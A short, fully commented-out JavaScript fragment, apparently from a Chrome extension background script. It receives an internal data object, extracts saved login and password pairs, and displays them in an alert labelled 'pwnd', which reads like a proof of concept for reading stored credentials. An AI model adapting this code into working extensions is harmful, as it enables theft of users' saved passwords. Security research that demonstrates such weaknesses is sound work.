// chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {
//   if (request.internalVariable) {
//     var internal_object = JSON.parse(request.internalVariable);
//       var pwnd = $.map(internal_object, function(e) {
//           if (e && e.login && e.login.login) {
//               return [e.login.login, e.login.password].join(':');
//           }
//       });
//       pwnd = 'Seems we were able to find:\n\n' + pwnd.join('\n');
//       chrome.extension.getViews().forEach(function(view){
//           view.alert(pwnd);
//       });
//   }
// });
// alert('BG: IAM here'); // working